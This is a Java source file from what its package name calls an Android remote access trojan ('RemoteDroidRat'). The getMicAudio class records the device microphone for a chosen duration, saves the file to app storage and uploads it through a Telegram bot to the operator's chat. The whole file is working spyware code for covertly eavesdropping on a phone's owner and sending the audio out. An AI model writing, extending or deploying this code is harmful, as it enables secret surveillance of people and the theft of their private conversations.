package com.KaranKumar.RemoteDroidRat.commandActions;

import android.media.MediaRecorder;
import android.content.Context;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.io.File;
import android.os.Handler;

public class getMicAudio {
    private Context context;
    private TelegramBotApi telegramBot;
    private adminInfo admin;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;

    public getMicAudio(Context context) {
        if (context != null) {
            this.context = context;
            this.telegramBot = new TelegramBotApi(context);
            this.admin = new adminInfo(context);
            this.mediaRecorder = new MediaRecorder();
            // Handle other initialization tasks if needed.
        } else {
            // Handle the case where context is null, log an error, or throw an exception.
        }
    }

    public void recordAndSendAudio(int Duretion) {
        try {
            if (!isRecording) {
                startRecording();

				new Handler().postDelayed(new Runnable(){

						@Override
						public void run() {
							stopRecording();
							// Send recorded audio to Telegram Bot
							sendAudioToTelegramBot(admin.getChatId(), getAudioFilePath());

						}
                    }, Duretion);
            } else {
                stopRecording();
                // Send recorded audio to Telegram Bot
                sendAudioToTelegramBot(admin.getChatId(), getAudioFilePath());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startRecording() {
        try {
            String audioFilePath = getAudioFilePath();

            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
            mediaRecorder.setOutputFile(audioFilePath);

            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecording = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopRecording() {
        try {
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaRecorder.release();

            isRecording = false;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getAudioFilePath() {
        return context.getFilesDir() + File.separator + "recorded_audio.3gp";
    }

    private void sendAudioToTelegramBot(String chatId, String audioFilePath) {
        if (isNetworkConnected()) {
            telegramBot.sendAudio(chatId, audioFilePath);
        }
    }

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }
}
